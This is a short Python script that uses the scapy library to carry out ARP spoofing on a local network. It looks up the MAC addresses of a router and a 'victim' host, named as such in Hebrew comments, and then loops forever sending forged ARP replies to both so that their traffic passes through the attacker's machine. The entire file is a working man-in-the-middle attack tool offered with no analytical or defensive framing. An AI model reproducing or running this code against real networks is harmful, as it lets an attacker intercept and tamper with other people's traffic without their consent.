

import scapy.all as scapy
import time

def spoof(gateway_ip, gateway_mac, victim_ip):
    spoofed_arp_packet = scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
    scapy.send(spoofed_arp_packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def wait_till_mac_found(ip):
    mac = None   
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print(f"MAC address for {ip} not found\n")
    return mac

#---------------------------------------
gateway_ip = "10.100.102.1"  # כתובת הנתב
target_ip = "10.100.102.13"  # כתובת הקורבן

target_mac = wait_till_mac_found(target_ip)
gateway_mac = wait_till_mac_found(gateway_ip)

while True:
    spoof(gateway_ip=target_ip, gateway_mac=target_mac, victim_ip=gateway_ip)
    spoof(gateway_ip=gateway_ip, gateway_mac=gateway_mac, victim_ip=target_ip)
    print("Spoofing is active")
    time.sleep(2)
